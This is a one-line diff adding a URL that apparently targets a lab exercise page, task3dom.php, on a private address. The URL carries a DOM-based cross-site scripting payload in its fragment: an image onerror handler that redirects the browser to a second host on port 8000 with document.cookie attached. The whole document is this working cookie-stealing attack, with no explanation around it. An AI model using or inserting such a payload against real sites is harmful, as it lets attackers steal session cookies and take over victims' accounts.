@@ -1,0 +1,1 @@
+http://192.168.1.203/task3dom.php#user=<img src=//0 onerror="document.location='http://192.168.1.201:8000/?c='+document.cookie">
